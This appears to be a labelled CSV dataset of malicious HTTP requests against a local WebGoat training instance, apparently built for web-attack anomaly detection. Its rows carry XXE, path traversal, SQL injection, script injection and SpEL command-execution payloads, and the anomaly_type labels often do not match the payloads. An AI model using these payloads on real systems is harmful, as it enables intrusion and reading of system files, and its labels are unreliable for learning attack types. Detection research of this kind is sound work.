request_id,timestamp,method,url,headers,body,app_target,anomaly_type,label
774,2025-12-06 8:50:00,POST,http://localhost:8080/WebGoat/Start.mvc,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}","<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>",WebGoat,path_traversal,anomalous
775,2025-12-06 9:00:00,GET,"http://localhost:8080/WebGoat/a2/sql-injection?<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",,WebGoat,sqli,anomalous
776,2025-12-06 9:10:00,GET,"http://localhost:8080/WebGoat/xxe?<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/xxe""}",,WebGoat,path_traversal,anomalous
777,2025-12-06 9:20:00,GET,http://localhost:8080/WebGoat/path-traversal?lesson=2.1&menu=200&id=1' OR '1'='1,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",,WebGoat,sqli,anomalous
778,2025-12-06 9:30:00,POST,http://localhost:8080/WebGoat/path-traversal,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",../../../../etc/passwd,WebGoat,sqli,anomalous
779,2025-12-06 9:40:00,POST,http://localhost:8080/WebGoat/SpEL,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/SpEL""}","<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>",WebGoat,spel_injection,anomalous
780,2025-12-06 9:50:00,GET,"http://localhost:8080/WebGoat/a2/sql-injection?<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",,WebGoat,path_traversal,anomalous
781,2025-12-06 10:00:00,POST,http://localhost:8080/WebGoat/path-traversal,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",../../../../etc/passwd,WebGoat,dom_xss,anomalous
782,2025-12-06 10:10:00,POST,http://localhost:8080/WebGoat/SpEL,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",#{T(java.lang.Runtime).getRuntime().exec('id')},WebGoat,xxe,anomalous
783,2025-12-06 10:20:00,GET,http://localhost:8080/WebGoat/clientSideFiltering?account=1' OR 1=1--,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",,WebGoat,dom_xss,anomalous
784,2025-12-06 10:30:00,POST,http://localhost:8080/WebGoat/clientSideFiltering,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",account=1' OR 1=1--,WebGoat,path_traversal,anomalous
785,2025-12-06 10:40:00,GET,http://localhost:8080/WebGoat/a2/sql-injection?searchTerm=<script>alert(1)</script>,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",,WebGoat,sqli,anomalous
786,2025-12-06 10:50:00,GET,http://localhost:8080/WebGoat/xxe?../../../../etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",,WebGoat,path_traversal,anomalous
787,2025-12-06 11:00:00,GET,"http://localhost:8080/WebGoat/path-traversal?<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",,WebGoat,spel_injection,anomalous
788,2025-12-06 11:10:00,GET,"http://localhost:8080/WebGoat/xxe?<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/xxe""}",,WebGoat,xxe,anomalous
789,2025-12-06 11:20:00,GET,http://localhost:8080/WebGoat/xxe?lesson=2.1&menu=200&id=1' OR '1'='1,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",,WebGoat,xxe,anomalous
790,2025-12-06 11:30:00,GET,"http://localhost:8080/WebGoat/SpEL?<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/SpEL""}",,WebGoat,path_traversal,anomalous
791,2025-12-06 11:40:00,GET,http://localhost:8080/WebGoat/SpEL?lesson=2.1&menu=200&id=1' OR '1'='1,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",,WebGoat,dom_xss,anomalous
792,2025-12-06 11:50:00,GET,http://localhost:8080/WebGoat/a2/sql-injection?lesson=2.1&menu=200&id=1' OR '1'='1,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",,WebGoat,spel_injection,anomalous
793,2025-12-06 12:00:00,POST,http://localhost:8080/WebGoat/xxe,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",searchTerm=<script>alert(1)</script>,WebGoat,dom_xss,anomalous
794,2025-12-06 12:10:00,POST,http://localhost:8080/WebGoat/xxe,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/xxe""}","<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>",WebGoat,path_traversal,anomalous
795,2025-12-06 12:20:00,GET,http://localhost:8080/WebGoat/Start.mvc?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",,WebGoat,dom_xss,anomalous
796,2025-12-06 12:30:00,GET,http://localhost:8080/WebGoat/clientSideFiltering?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",,WebGoat,dom_xss,anomalous
797,2025-12-06 12:40:00,POST,http://localhost:8080/WebGoat/xxe,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/xxe""}","<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>",WebGoat,dom_xss,anomalous
798,2025-12-06 12:50:00,POST,http://localhost:8080/WebGoat/clientSideFiltering,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",../../../../etc/passwd,WebGoat,path_traversal,anomalous
799,2025-12-06 13:00:00,POST,http://localhost:8080/WebGoat/SpEL,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",account=1' OR 1=1--,WebGoat,dom_xss,anomalous
800,2025-12-06 13:10:00,GET,http://localhost:8080/WebGoat/xxe?searchTerm=<script>alert(1)</script>,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",,WebGoat,spel_injection,anomalous
801,2025-12-06 13:20:00,GET,http://localhost:8080/WebGoat/Start.mvc?../../../../etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",,WebGoat,spel_injection,anomalous
802,2025-12-06 13:30:00,POST,http://localhost:8080/WebGoat/Start.mvc,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",#{T(java.lang.Runtime).getRuntime().exec('id')},WebGoat,dom_xss,anomalous
803,2025-12-06 13:40:00,GET,http://localhost:8080/WebGoat/a2/sql-injection?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",,WebGoat,sqli,anomalous
804,2025-12-06 13:50:00,GET,http://localhost:8080/WebGoat/clientSideFiltering?lesson=2.1&menu=200&id=1' OR '1'='1,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",,WebGoat,dom_xss,anomalous
805,2025-12-06 14:00:00,POST,http://localhost:8080/WebGoat/Start.mvc,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",account=1' OR 1=1--,WebGoat,xxe,anomalous
806,2025-12-06 14:10:00,GET,http://localhost:8080/WebGoat/Start.mvc?searchTerm=<script>alert(1)</script>,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",,WebGoat,xxe,anomalous
807,2025-12-06 14:20:00,GET,http://localhost:8080/WebGoat/clientSideFiltering?account=1' OR 1=1--,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",,WebGoat,spel_injection,anomalous
808,2025-12-06 14:30:00,GET,http://localhost:8080/WebGoat/a2/sql-injection?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",,WebGoat,sqli,anomalous
809,2025-12-06 14:40:00,GET,"http://localhost:8080/WebGoat/path-traversal?<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",,WebGoat,xxe,anomalous
810,2025-12-06 14:50:00,GET,http://localhost:8080/WebGoat/SpEL?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",,WebGoat,dom_xss,anomalous
811,2025-12-06 15:00:00,POST,http://localhost:8080/WebGoat/xxe,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",lesson=2.1&menu=200&id=1' OR '1'='1,WebGoat,path_traversal,anomalous
812,2025-12-06 15:10:00,GET,http://localhost:8080/WebGoat/a2/sql-injection?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",,WebGoat,path_traversal,anomalous
813,2025-12-06 15:20:00,GET,http://localhost:8080/WebGoat/xxe?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",,WebGoat,xxe,anomalous
814,2025-12-06 15:30:00,POST,http://localhost:8080/WebGoat/xxe,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",../../../../etc/passwd,WebGoat,xxe,anomalous
815,2025-12-06 15:40:00,GET,http://localhost:8080/WebGoat/SpEL?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",,WebGoat,path_traversal,anomalous
816,2025-12-06 15:50:00,POST,http://localhost:8080/WebGoat/SpEL,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",../../../../etc/passwd,WebGoat,dom_xss,anomalous
817,2025-12-06 16:00:00,POST,http://localhost:8080/WebGoat/Start.mvc,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",searchTerm=<script>alert(1)</script>,WebGoat,dom_xss,anomalous
818,2025-12-06 16:10:00,POST,http://localhost:8080/WebGoat/xxe,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/xxe""}","<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>",WebGoat,path_traversal,anomalous
819,2025-12-06 16:20:00,POST,http://localhost:8080/WebGoat/xxe,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",lesson=2.1&menu=200&id=1' OR '1'='1,WebGoat,path_traversal,anomalous
820,2025-12-06 16:30:00,POST,http://localhost:8080/WebGoat/path-traversal,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",#{T(java.lang.Runtime).getRuntime().exec('id')},WebGoat,spel_injection,anomalous
821,2025-12-06 16:40:00,GET,http://localhost:8080/WebGoat/a2/sql-injection?account=1' OR 1=1--,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",,WebGoat,xxe,anomalous
822,2025-12-06 16:50:00,POST,http://localhost:8080/WebGoat/clientSideFiltering,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",#{T(java.lang.Runtime).getRuntime().exec('id')},WebGoat,sqli,anomalous
823,2025-12-06 17:00:00,GET,http://localhost:8080/WebGoat/xxe?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",,WebGoat,dom_xss,anomalous
824,2025-12-06 17:10:00,GET,"http://localhost:8080/WebGoat/Start.mvc?<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",,WebGoat,path_traversal,anomalous
825,2025-12-06 17:20:00,POST,http://localhost:8080/WebGoat/xxe,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",account=1' OR 1=1--,WebGoat,spel_injection,anomalous
826,2025-12-06 17:30:00,GET,http://localhost:8080/WebGoat/clientSideFiltering?account=1' OR 1=1--,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",,WebGoat,xxe,anomalous
827,2025-12-06 17:40:00,POST,http://localhost:8080/WebGoat/clientSideFiltering,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",account=1' OR 1=1--,WebGoat,xxe,anomalous
828,2025-12-06 17:50:00,GET,http://localhost:8080/WebGoat/SpEL?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",,WebGoat,xxe,anomalous
829,2025-12-06 18:00:00,GET,http://localhost:8080/WebGoat/xxe?lesson=2.1&menu=200&id=1' OR '1'='1,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",,WebGoat,xxe,anomalous
830,2025-12-06 18:10:00,GET,http://localhost:8080/WebGoat/path-traversal?searchTerm=<script>alert(1)</script>,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",,WebGoat,spel_injection,anomalous
831,2025-12-06 18:20:00,GET,"http://localhost:8080/WebGoat/xxe?<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/xxe""}",,WebGoat,sqli,anomalous
832,2025-12-06 18:30:00,POST,http://localhost:8080/WebGoat/path-traversal,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",#{T(java.lang.Runtime).getRuntime().exec('id')},WebGoat,spel_injection,anomalous
833,2025-12-06 18:40:00,POST,http://localhost:8080/WebGoat/a2/sql-injection,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",searchTerm=<script>alert(1)</script>,WebGoat,path_traversal,anomalous
834,2025-12-06 18:50:00,POST,http://localhost:8080/WebGoat/a2/sql-injection,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}","<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>",WebGoat,spel_injection,anomalous
835,2025-12-06 19:00:00,GET,"http://localhost:8080/WebGoat/path-traversal?<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/path-traversal""}",,WebGoat,spel_injection,anomalous
836,2025-12-06 19:10:00,GET,http://localhost:8080/WebGoat/clientSideFiltering?lesson=2.1&menu=200&id=1' OR '1'='1,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",,WebGoat,xxe,anomalous
837,2025-12-06 19:20:00,POST,http://localhost:8080/WebGoat/Start.mvc,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",../../../../etc/passwd,WebGoat,xxe,anomalous
838,2025-12-06 19:30:00,GET,http://localhost:8080/WebGoat/clientSideFiltering?account=1' OR 1=1--,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",,WebGoat,spel_injection,anomalous
839,2025-12-06 19:40:00,GET,http://localhost:8080/WebGoat/SpEL?../../../../etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",,WebGoat,dom_xss,anomalous
840,2025-12-06 19:50:00,GET,http://localhost:8080/WebGoat/Start.mvc?../../../../etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/Start.mvc""}",,WebGoat,xxe,anomalous
841,2025-12-06 20:00:00,GET,http://localhost:8080/WebGoat/a2/sql-injection?#{T(java.lang.Runtime).getRuntime().exec('id')},"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",,WebGoat,sqli,anomalous
842,2025-12-06 20:10:00,GET,http://localhost:8080/WebGoat/xxe?account=1' OR 1=1--,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/xxe""}",,WebGoat,spel_injection,anomalous
843,2025-12-06 20:20:00,GET,http://localhost:8080/WebGoat/a2/sql-injection?../../../../etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",,WebGoat,sqli,anomalous
844,2025-12-06 20:30:00,POST,http://localhost:8080/WebGoat/path-traversal,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/path-traversal""}","<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>",WebGoat,path_traversal,anomalous
845,2025-12-06 20:40:00,GET,http://localhost:8080/WebGoat/a2/sql-injection?account=1' OR 1=1--,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",,WebGoat,sqli,anomalous
846,2025-12-06 20:50:00,GET,"http://localhost:8080/WebGoat/SpEL?<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><user><name>&xxe;</name></user>","{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/xml"", ""X-Original-URL"": ""/WebGoat/SpEL""}",,WebGoat,spel_injection,anomalous
847,2025-12-06 21:00:00,GET,http://localhost:8080/WebGoat/clientSideFiltering?searchTerm=<script>alert(1)</script>,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/clientSideFiltering""}",,WebGoat,xxe,anomalous
848,2025-12-06 21:10:00,POST,http://localhost:8080/WebGoat/a2/sql-injection,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/a2/sql-injection""}",#{T(java.lang.Runtime).getRuntime().exec('id')},WebGoat,sqli,anomalous
849,2025-12-06 21:20:00,GET,http://localhost:8080/WebGoat/SpEL?lesson=2.1&menu=200&id=1' OR '1'='1,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""X-Original-URL"": ""/WebGoat/SpEL""}",,WebGoat,dom_xss,anomalous
